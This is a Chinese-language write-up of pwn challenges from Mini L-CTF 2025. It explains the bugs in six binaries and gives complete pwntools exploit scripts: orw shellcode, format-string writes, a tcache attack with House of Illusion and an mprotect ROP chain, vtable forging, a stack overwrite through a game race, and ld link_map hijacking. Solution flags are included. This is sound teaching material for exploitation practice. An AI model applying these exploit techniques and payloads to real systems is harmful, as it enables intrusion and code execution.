# Mini L-CTF 2025 Pwn Writeup

## Ex-Aid lv.2

签到题，将 orw 分成 3 段，每段 0x18 字节，可以用短转移指令连接。

```python
#! /usr/bin/env python3
from pwn import *
from ctools import *

### CONFIG ========================================

context(os="linux", arch="amd64")

elf_path = './checkin'
libc_path = './libc.so.6'

config = {
    'host': '127.0.0.1',
    'port': 45495,
    'target': 'REMOTE',
    'args': [],
    'preload': [libc_path],
    'elf_path': elf_path,
    'libc_path': libc_path,
    'apath': '.',
}

TMUX_TERMINAL() # use tmux terminal
DEBUG = lambda s='', l=True, m=False: udebug(io, script=s, load=l, source=m)

cct(**config)
cct.init()

### CONFIG END ===================================

io = conn()
# context.log_level = "debug"
 
elf = ELF(elf_path)
libc = ELF(libc_path, checksec=False)

def exp():
    shellcode = [
    """
        mov rax, 0x67616c662f
        push rax
    """, 
    """
        push rsp ; pop rdi
        xor rsi, rsi
        xor rdx, rdx
        push __NR_open ; pop rax
        syscall
    """,
    """
        push rax ; pop rdi
        push rsp ; pop rsi
        push 0x50 ; pop rdx
        push __NR_read ; pop rax
        syscall
    
        push 1 ; pop rdi
        push __NR_write ; pop rax
        syscall
    """]
    shellcode = b''.join([asm(i).ljust(0x16, b'\x90') + asm('jmp $+0xa') for i in shellcode])

    io.send(shellcode)

    pass

if __name__ == '__main__':
    exp()
    io.interactive()
```

## PostBox

未初始化变量栈重叠和格式化字符串。

```python
from pwn import *
from LibcSearcher import*
#context.log_level = 'debug'
context.terminal = ['wt.exe', 'wsl']
context.arch = 'amd64'
context.os = 'linux'
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
def exp():
    io = remote('127.0.0.1', 45808)
    #io = process('./PostBox')
    saf = lambda x, y: io.sendlineafter(x, y)
    saf("choice:\n",str(2))
    saf(":\n", b'A'* 0x2fc + b'\x52\xbf\x01\x00')
    saf(":\n", "%4c%49$n%280c%50$n")
    saf(":\n", "leak_addr:%53$p")
    io.recvuntil("addr:")
    leak_addr = int(io.recv(14),16)
    textbase = leak_addr - 0x17c3
    log.success("leak address:" + hex(leak_addr))
    log.success("base address:" + hex(textbase))
    check_failed = textbase + 0x4028
    backdoor = textbase + 0x177e
    log.success("check_failed address:" + hex(check_failed))
    payload = b'%23c%13$hhn%103c%14$hhnA' + p64(check_failed + 1) + p64(check_failed)
    saf(":\n", payload)
    saf(":\n", b'a' * 281)
    io.recvuntil("mit\n")
    try:
        res = io.recv(timeout=2)
        if b"Enjoy" in res:
            print("[+]Get shell.")
            io.interactive()
            return True
        else:
            io.close()
            return False
    except EOFError:
        io.close()
        return False
if __name__ == '__main__': 
    for i in range(100):
        if exp():
            break
```

## EasyHeap

开了沙箱，禁用了`open`和`openat`。表面上没禁`execve`，但是如果我们用`strace`跟踪`/bin/sh`的启动就会发现程序启动时其实会使用很多系统调用，其中就包括`openat`，用来打开和加载共享库。所以这里如果直接使用`execve("/bin/sh", 0, 0)`是会直接触发 bad syscall 的。

```
execve("/bin/sh", ["/bin/sh"], 0x7ffd2916d580 /* 66 vars */) = 0
brk(NULL)                               = 0x55ceedb6c000
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7e3907eb0000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
fstat(3, {st_mode=S_IFREG|0644, st_size=133151, ...}) = 0
mmap(NULL, 133151, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7e3907e8f000
close(3)                                = 0
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\220\243\2\0\0\0\0\0"..., 832) = 832
pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
fstat(3, {st_mode=S_IFREG|0755, st_size=2125328, ...}) = 0
pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
mmap(NULL, 2170256, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7e3907c00000
mmap(0x7e3907c28000, 1605632, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x28000) = 0x7e3907c28000
mmap(0x7e3907db0000, 323584, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1b0000) = 0x7e3907db0000
mmap(0x7e3907dff000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1fe000) = 0x7e3907dff000
mmap(0x7e3907e05000, 52624, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7e3907e05000
close(3)                                = 0
mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7e3907e8c000
arch_prctl(ARCH_SET_FS, 0x7e3907e8c740) = 0
set_tid_address(0x7e3907e8ca10)         = 236291
set_robust_list(0x7e3907e8ca20, 24)     = 0
rseq(0x7e3907e8d060, 0x20, 0, 0x53053053) = 0
mprotect(0x7e3907dff000, 16384, PROT_READ) = 0
mprotect(0x55ceadf41000, 8192, PROT_READ) = 0
mprotect(0x7e3907eee000, 8192, PROT_READ) = 0
prlimit64(0, RLIMIT_STACK, NULL, {rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
munmap(0x7e3907e8f000, 133151)          = 0
getuid()                                = 1000
getgid()                                = 1000
getpid()                                = 236291
rt_sigaction(SIGCHLD, {sa_handler=0x55ceadf36cd0, sa_mask=~[RTMIN RT_1], sa_flags=SA_RESTORER, sa_restorer=0x7e3907c45330}, NULL, 8) = 0
geteuid()                               = 1000
getrandom("\x62\xfd\xc5\xe7\x03\xe0\xe9\x1e", 8, GRND_NONBLOCK) = 8
brk(NULL)                               = 0x55ceedb6c000
brk(0x55ceedb8d000)                     = 0x55ceedb8d000
```

程序直接给了 UAF，打的方式很多很自由，但受到`fgets`的影响不能直接 leak environ。这里我用了一种相对比较简单的方法。由于 tcache 堆块的 double free 检测是通过检查第二个字段的值来实现的，所以我们可以通过不断清 key 来重复释放一个 tcache 堆块来 leak heap 和 libc，通过 Tcache Attack 可以任意地址读写。

这里 leak stack 虽然不能直接通过分配堆块到 environ 来 leak，但我们依然可以通过 stdout (也是一种 no leak 场景下比较常用的技术) 或是一些 house 系列的任意地址读来完成。

之后就是 rop ，通过 mprotect 来 ret2shellcode。

```python
#! /usr/bin/env python3
from pwn import *
from ctools import *
from SomeofHouse import *

### CONFIG ========================================

context(os="linux", arch="amd64")

elf_path = './vuln'
libc_path = './libc.so.6'

config = {
    'host': '127.0.0.1',
    'port': 33087,
    'target': 'REMOTE',
    'args': [],
    'preload': [libc_path],
    'elf_path': elf_path,
    'libc_path': libc_path,
    'apath': '.',
}

TMUX_TERMINAL() # use tmux terminal
DEBUG = lambda s='', l=True, m=False: udebug(io, script=s, load=l, source=m)

cct(**config)
cct.init()

### CONFIG END ===================================

io = conn()
# context.log_level = "debug"
 
elf = ELF(elf_path)
libc = ELF(libc_path, checksec=False)

def add(idx, size, pad):
    io.sendlineafter(b'Choice', b'1')
    io.sendlineafter(b'Index', str(idx).encode())
    io.sendlineafter(b'Size', str(size).encode())
    io.sendlineafter(b'data', pad)

def show(idx):
    io.sendlineafter(b'Choice', b'3')
    io.sendlineafter(b'Index', str(idx).encode())

def free(idx):
    io.sendlineafter(b'Choice', b'4')
    io.sendlineafter(b'Index', str(idx).encode())

def edit(idx, pad):
    io.sendlineafter(b'Choice', b'2')
    io.sendlineafter(b'Index', str(idx).encode())
    io.sendlineafter(b'data', pad)

def reveal_ptr(ptr, addr):
    return (addr >> 12) ^ ptr

def exp():
    add(0, 0x100, b'asd') # $+0x480 -> shellcode
    add(1, 0x100, b'asd') # $+0x590 -> tcache attack
    add(31, 0x100, b'gap')
    
    #-------------------------- LEAK HEAP AND LIBC --------------------------#
    
    free(1)
    add(2, 0x100, b'a' * 0x10)
    free(1)
    show(2)
    io.recvuntil(b'Data: ')
    heap_base = u64(io.recvuntil(b'\n', drop=True).ljust(8, b'\x00')) << 12
    success(f'{heap_base = :#x}')

    for _ in range(7):
        edit(2, b'a' * 0x10)
        free(1)
    
    show(2)
    io.recvuntil(b'Data: ')
    libc.address = u64(io.recv(6).ljust(8, b'\x00')) - 0x203b20
    success(f'{libc.address = :#x}')

    #-------------------------- Tcache Attack --------------------------#

    shellcode_addr = heap_base + 0x480
    chunk_addr = heap_base + 0x590

    shellcode = f"""
        push 0x50
        lea rax, [rsp - 0x90]
        push rax
    
        mov rax, 0x67616c662f
        push rax
    
        push __NR_openat2 ; pop rax
        xor rdi, rdi
        push rsp ; pop rsi
        push rdi ; push rdi ; push rdi
        mov rdx, rsp
        push 0x18 ; pop r10
        syscall
        popf ; popf ; popf
        push rax
    
        push __NR_readv ; pop rax
        pop rdi
        popf
        push rsp ; pop rsi
        push 1 ; pop rdx
        syscall
    
        push __NR_writev ; pop rax
        push 1 ; pop rdi
        syscall
    """
    edit(0, asm(shellcode))
    
    edit(2, p64(reveal_ptr(libc.symbols['_IO_list_all'], chunk_addr)))

    add(3, 0x100, b'asd')
    add(4, 0x100, p64(chunk_addr))

    #-------------------------- House of Illusion --------------------------#

    hoi = HouseOfSome(libc, chunk_addr + 0x400)
    pad = hoi.hoi_read_file_template(chunk_addr + 0x400, 0x400, chunk_addr + 0x400, 0)
    edit(2, pad)

    io.sendlineafter(b'Choice', b'5')
    io.recvuntil(b': ')
    
    rop = flat([
        # pop rdi; ret
        libc.address + 0x10f75b,
        heap_base,
         # pop rsi ; ret
        libc.address + 0x110a4d,
        0x1000,
        # pop rdx ; xor eax, eax ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
        libc.address + 0xb503c,
        7, 0, 0, 0, 0, 
        libc.symbols['mprotect'],
        shellcode_addr
    ])
    stack = hoi.bomb_raw(io)
    success(f'{stack = :#x}')

    io.sendline(rop)

    pass

if __name__ == '__main__':
    exp()
    io.interactive()
```

## CTFers

程序有三个功能，增删查。新增时暂存名字用到了 `name_buf`，查询时有一个虚函数调用 `Binary::info` 或 `Web::info`。另外还有一个隐藏后门 `0xdeadbeef`，可以修改一次 `ctfers` 首个元素的地址。既然程序没有开启 PIE，那么当然可以将地址改到 `name_buf`，从而在输入名字时伪造 `CTFer` 对象。但我们首先要知道这个对象里有什么。

`Binary` 和 `Web` 继承自 `CTFer`，`std::vector` 存储这两种对象时仅存储其指针而丢弃了类型信息。然而我们依旧可以直接调用对应类型的 `info`，这是因为 C++ 运行时多态特性。虽然 C++ 标准并未规定，但大多数编译器实现它的方式是**虚函数表**。通过在对象中存储一个虚函数表指针指向存储对应成员函数指针的虚函数表来实现运行时多态。本题虚函数调用在此：

```assembly
004025f4  mov     rdx, qword [rax]
004025f7  mov     rdx, qword [rdx]
004025fa  mov     rdi, rax
004025fd  call    rdx
```

`CTFer` 对象还用 **STL 容器 `std::vector`** 存储了名字字符串。其具体实现依赖编译器，但我们可以通过在 `new` 前后断点，查看新增堆块的内容来反推其结构。

以下是用 C 语言表示的 `CTFer` 对象：（符号名仅作参考）

```c
struct CTFer {
    void (**vtable)(struct CTFer *);
    int64_t points;
    struct std_string {
        char *base;
        size_t length;
        union {
            size_t capacity;
            char buffer[16];
        };
    } nickname;
};
```

当 `length < 16` 时 `buffer` 复用 `capacity` 内存而非单独 malloc，不过这并不重要。我们可以先恢复正确的虚函数表，然后修改 nickname `base` 指向 GOT 项，修改适当的 `length`，从而通过 `print_info` 泄露基址。

获得各个库的基址绕过 ASLR 后解法就十分自由了，只要找到栈迁移 gadget 即可执行任意代码。需要注意调用 `info` 虚函数时 RAX 和 RDI 都指向 `CTFer` 对象，也就是可控的 `name_buf`，可依此选择 gadget。

这里我们选用来自 libstdc++ 中的一个 COP gadget：

```c
0x0000000000113764: mov rbp, rax; lea r12, [rax - 1]; test rdi, rdi; je 0x113c79; mov rax, qword ptr [rdi]; call qword ptr [rax + 0x30];
```

然后只需要在 `name_buf` 上写 ROP 链即可。

Exp:

```python
from pwn import *
context(os='linux', arch='amd64')

e = ELF('./ctfers')
io = ...
libc = ELF('./libc.so.6', checksec=False)


def add(fake_object: bytes):
    io.sendlineafter(b'Choice > ', b'0')
    io.sendlineafter(b'Name > ', fake_object)
    io.sendlineafter(b'Points > ', b'0')
    io.sendlineafter(b'- 1 > ', b'0')


def show_info():
    io.sendlineafter(b'Choice > ', b'2')


def backdoor(address: int):
    io.sendlineafter(b'Choice > ', str(0xdeadbeef).encode())
    io.sendline(str(address).encode())


vtable = 0x408C98
cout = 0x409080
libc_start_main_got = e.got['__libc_start_main']
input_buf = e.sym['name_buf']

# 还原虚函数表指针，改 std::string 头指针为 got 项
add(cyclic(16) + p64(vtable) + p64(0) +
    p64(libc_start_main_got) + p64(8) + p64(8))
backdoor(input_buf + 16)
show_info()  # leak libc

io.recvuntil(b'I am ')
libc.address = u64(io.recv(8)) - 0x274c0 - 0x2900
success(f'libc_base: 0x{libc.address:x}')

add(cyclic(16) + p64(vtable) + p64(0) + p64(cout) + p64(8) + p64(8))
backdoor(input_buf + 16)
show_info()  # leak libstdc++

io.recvuntil(b'I am ')
libstdcxx_base = u64(io.recv(8)) - 0x223370
success(f'libstdcxx_base: 0x{libstdcxx_base:x}')

# mov rbp, rax; lea r12, [rax - 1]; test rdi, rdi; je 0x113c79; mov rax, qword ptr [rdi]; call qword ptr [rax + 0x30];
magic = libstdcxx_base + 0x0000000000113764
leave = 0x0000000000402a63
pop_rax = libstdcxx_base + 0x00000000000da536
pop_rbp = libstdcxx_base + 0x00000000000aafb3
one_gadget = libc.address + 0xebd43
add(cyclic(16) + p64(input_buf + 8 + 16) + p64(magic) +
    
    p64(pop_rax) +
    p64(0) +
    p64(pop_rbp) +
    p64(0x4093a0) +
    p64(one_gadget) +
    
    p64(leave))
show_info() # 栈迁移 ROP

io.interactive()
```

Payload 有时会被空白字符截断，可能需要多次尝试。另外，类似虚函数表劫持的利用手法一般需要通过 UAF 构造重叠堆块来控制虚函数表指针。本题在删除 CTFer 时仅调用了 `std::vector#remove(...)`，由于 `ctfers` 中存储的是 `CTFer *`，`remove` 并不会调用 `CTFer` 对象的析构器也不会释放其内存。题目初版有 `delete` 也有 UAF，后简化为给一个后门函数并关闭 PIE。

```
miniLCTF{In_real_scenarios_you_need_a_UAF}
```

## MiniSnake

程序存在后门函数且没有开启 PIE。漏洞点是 `events_handler` 线程同时处理撞墙和得分，但是用于闪烁显示“GOT POINT!”的 `thrd_sleep` 会阻塞线程从而使 `events_handler` **有可能错过撞墙事件处理**。通过源码可以看出地图存储在栈上，蛇身也在显示前先写入地图中。如果开始游戏前选择“Numeric skin”则可以向栈上写入任意数值，在得分之后立即撞墙则可以穿墙越界写入。

需要**找到合适的种子**生成合适的初始蛇或食物从而写入后门函数地址。得到合适的种子很简单，只需要照着程序逻辑写一个爆破程序即可。

```c
#include <limits.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

int main(void) {
    for (int seed = 0; seed < INT_MAX; ++seed) {
        srandom(seed);
        if (random() % (UINT8_MAX - 1) + 1 == 0x40 &&
            random() % (UINT8_MAX - 1) + 1 == 0x16 &&
            random() % (UINT8_MAX - 1) + 1 == 0x4D) {
            printf("FOUND SEED: %d\n", seed);
        }
    }
    return 0;
}
```

但是返回地址在地图外的哪里？还得小心 stack canary。如果动态调试寻找的话会十分折磨。可以考虑用 keypatch 等工具修改程序中地图显示的高度从而快速定位返回地址的位置。（也可考虑修改源码再编译）

```assembly
.text:0000000000401DDB
.text:0000000000401DDB loc_401DDB:                             ; CODE XREF: draw+83↑j
.text:0000000000401DDB                 cmp     [rbp+var_18], 11h ; Keypatch modified this from:
.text:0000000000401DDB                                         ;   cmp [rbp+var_18], 0Fh

.text:000000000040249F                 mov     edi, 14h        ; int
.text:000000000040249F                                         ; Keypatch modified this from:
.text:000000000040249F                                         ;   mov edi, 12h
```

Patch 后再次启动程序就可以看到效果（可能需要调整下终端宽高）：

```
*--------------------------------*
|                                |
|      aa                        |
|            ac                  |
|                        b49182  |
|                                |
|                                |14 3
|                                |
|                10              |
|        ca                      |
|                              ab|
|            1b            de    |
|    98                          |
|            ad      be          |
|                                |
|                                |
|                                |
|d0eb1212ff7f      f3584b5c7e1f54|
|20ec1212ff7f    a32640          |
*--------------------------------*
```

可以看到返回地址就在右下角，其上是 stack canary。

合适的种子可以是 16183281，此时初始蛇身就是后门函数地址。接下来穿墙到达返回地址的位置按 Q 退出即可。记下拐弯时的坐标方便攻击远程环境。

```
miniLCTF{secret_destination_behind_walls}
```

## MmapHeap

本题的预期解是动态链接过程相关的利用。题目的堆分配器在 mmap 的内存上，和共享库和 ld 相邻。通过 off by null 可以溢出到下个 node，从而构造重叠堆。

libmylib 里有 2 个函数，`r_open`和`f_open`，后者是假的 open 函数。题目意思很明显是想让`f_open`实际调用到`r_open`，而 libmylib 里几乎没有可利用的地方，所以不可避免的会攻击 ld。

ld 相关的利用还挺多的，也很灵活，网上应该也有很多相关的文章。出题的思路在[这里](https://hackmd.io/@pepsipu/ry-SK44pt)，一道很有意思的题目，可以让你更加深入地了解动态链接，有兴趣可以尝试一下。这里的利用思路很简单，在任意地址分配后可以直接攻击 elf link_map。在第一次解析一个函数时会把解析到的地址放入 elf 的 GOT 表，而放入 GOT 表内的哪个位置由`l_addr`字段和该函数在 GOT 表中的偏移决定。通过给`l_addr`字段添加一个偏移可以控制解析到的地址覆盖到一个指定的位置。例如这里`r_open`和`f_open` GOT 表中的偏移为 8 字节，所以可以将`l_addr`的 LSB 设为 0x8，这样就可以实现`f_open`函数的劫持。由于自动补`\0`，有 1/16 的几率爆破成功。

> 实际解题发现不少人直接 leak elf base，然后 hijack GOT 了，还是限制太少了（笑

```python
#! /usr/bin/env python3
from pwn import *
from ctools import *

### CONFIG ========================================

context(os="linux", arch="amd64")

elf_path = './vuln'
libc_path = './libmylib.so'

config = {
    'host': '127.0.0.1',
    'port': 9999,
    'target': 'REMOTE',
    'args': [],
    'preload': [libc_path],
    'elf_path': elf_path,
    'libc_path': libc_path,
    'apath': '.',
}

TMUX_TERMINAL() # use tmux terminal
DEBUG = lambda s='', l=True, m=False: udebug(io, script=s, load=l, source=m)

cct(**config)
# cct.init()

### CONFIG END ===================================

io = conn()
# context.log_level = "debug"
 
elf = ELF(elf_path)
libc = ELF(libc_path)

def add(idx, size, pad):
    io.sendlineafter(b'option:', b'1')
    io.sendlineafter(b'idx', str(idx).encode())
    io.sendlineafter(b'size', str(size).encode())
    io.sendafter(b'data', pad)
    
def show(idx):
    io.sendlineafter(b'option:', b'4')
    io.sendlineafter(b'idx', str(idx).encode())

def free(idx):
    io.sendlineafter(b'option:', b'3')
    io.sendlineafter(b'idx', str(idx).encode())

def edit(idx, pad):
    io.sendlineafter(b'option:', b'2')
    io.sendlineafter(b'idx', str(idx).encode())
    io.sendafter(b'data', pad)

def load(idx, filename):
    io.sendlineafter(b'option:', b'5')
    io.sendlineafter(b'idx', str(idx).encode())
    io.sendlineafter(b'filename', filename)

def exp():
    #---------------------- OVERLAPPING ----------------------#
    add(0, 0x100 - 0x30 - 0x10 - 0x10, b'asd')
    add(1, 0x100 - 0x20, p64(0x30000000) + p64(0))
    add(2, 0x10, b'asd')
    add(3, 0xfe00 - 0x10, b'asd')
    add(4, 0xff90, b'asd')
    free(2)
    add(5, 0x20, b'a' * 0x20)
    
    #------------------------ ATTACK ------------------------#
    LD_OFFSET = 0x1cef0 - 0x6000
    add(6, LD_OFFSET + 0x392e0 - 0x10, b'asd')
    
    load(0, b'/flag') # resolve `strstr`
    add(7, 0x300, b'\x08')
    load(0, b'asd') # resolve `r_open` to `f_open`
    load(0, b'/flag')
    
    show(0)

    pass

if __name__ == '__main__':
    while(True):
        try:
            exp()
            break
        except EOFError:
            io.close()
            # pause()
            io = conn()
    io.interactive()
```
